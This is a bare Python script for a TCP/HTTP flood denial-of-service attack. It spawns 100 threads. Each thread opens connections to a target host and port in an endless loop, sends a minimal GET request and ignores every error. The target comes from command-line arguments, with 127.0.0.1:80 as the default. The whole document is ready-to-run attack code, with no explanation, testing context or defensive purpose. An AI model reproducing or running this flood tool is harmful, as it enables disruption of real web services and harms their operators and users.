import socket
import threading
import sys

def tcp_flood(target, port, threads=100):
    def attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode(), (target, port))
                s.sendto(("Host: " + target + "\r\n\r\n").encode(), (target, port))
                s.close()
            except:
                pass

    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()

target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
tcp_flood(target, port)
